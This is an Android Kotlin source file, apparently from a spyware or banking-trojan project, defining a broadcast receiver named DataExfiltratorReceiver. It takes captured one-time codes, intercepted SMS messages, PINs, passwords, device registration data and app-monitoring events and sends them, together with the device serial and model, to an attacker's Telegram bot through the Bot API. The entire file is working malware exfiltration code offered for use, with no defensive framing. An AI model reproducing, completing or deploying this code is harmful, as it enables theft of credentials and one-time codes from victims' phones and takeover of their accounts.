package com.decry.decry

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.util.Log
import java.text.SimpleDateFormat
import java.util.*

/**
 * DataExfiltratorReceiver
 *
 * Receives captured data broadcasts and sends them directly to Telegram.
 * All exfiltration is done via Telegram bot API.
 */
class DataExfiltratorReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "DecryExfil"
        private const val TELEGRAM_API_URL = "https://api.telegram.org/bot"
        private const val ACTION_DATA_CAPTURED = "com.decry.DATA_CAPTURED"
        private const val ACTION_SMS_INTERCEPTED = "com.decry.SMS_INTERCEPTED"
    }

    override fun onReceive(context: Context, intent: Intent) {
        val action = intent.action ?: return

        when (action) {
            ACTION_DATA_CAPTURED -> {
                val type = intent.getStringExtra("type") ?: "unknown"
                val content = intent.getStringExtra("content") ?: ""
                val extra = intent.getStringExtra("extra") ?: ""

                // Send directly to Telegram
                sendToTelegram(type, content, extra)
            }

            ACTION_SMS_INTERCEPTED -> {
                val sender = intent.getStringExtra("sender") ?: "unknown"
                val message = intent.getStringExtra("message") ?: ""
                val timestamp = intent.getStringExtra("timestamp") ?: ""

                sendToTelegram("sms_intercept", "$sender: $message", "timestamp=$timestamp")
            }
        }
    }

    private fun sendToTelegram(type: String, content: String, extra: String) {
        Thread {
            try {
                val botToken = System.getenv("CRYTAKE_BOT_TOKEN") ?: "YOUR_BOT_TOKEN"
                val chatId = System.getenv("CRYTAKE_CHAT_ID") ?: "YOUR_CHAT_ID"

                val deviceId = android.os.Build.getSerial()
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

                val title = when (type) {
                    "otp", "otp_capture", "sms_intercept", "sms" -> "📱 OTP/SMS Capture"
                    "pin", "pin_capture" -> "🔐 PIN Capture"
                    "password_capture" -> "🔑 Password Capture"
                    "sim_number", "device_register" -> "📴 Device Registration"
                    "dnd_status" -> "🔕 DND Status"
                    "app_foreground" -> "👁️ App Monitoring"
                    else -> "🎯 Data Capture"
                }

                val message = """
$title

📡 Type: $type
📝 Content: $content
📱 Device: ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}
⏱️ Time: $timestamp
${if (extra.isNotEmpty()) "➕ Extra: $extra" else ""}

🆔 Device ID: $deviceId
                """.trimIndent()

                val encodedMsg = Uri.encode(message)
                val postData = "chat_id=$chatId&text=$encodedMsg&parse_mode=Markdown"
                val url = "$TELEGRAM_API_URL${botToken}/sendMessage"

                val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.doOutput = true
                connection.connectTimeout = 15000
                connection.readTimeout = 15000

                connection.outputStream.use { os ->
                    os.write(postData.toByteArray(Charsets.UTF_8))
                    os.flush()
                }

                val responseCode = connection.responseCode
                if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                    Log.i(TAG, "Data sent to Telegram: $type")
                } else {
                    Log.w(TAG, "Telegram send failed: $responseCode")
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e(TAG, "Telegram send error: ${e.message}")
            }
        }.start()
    }
}
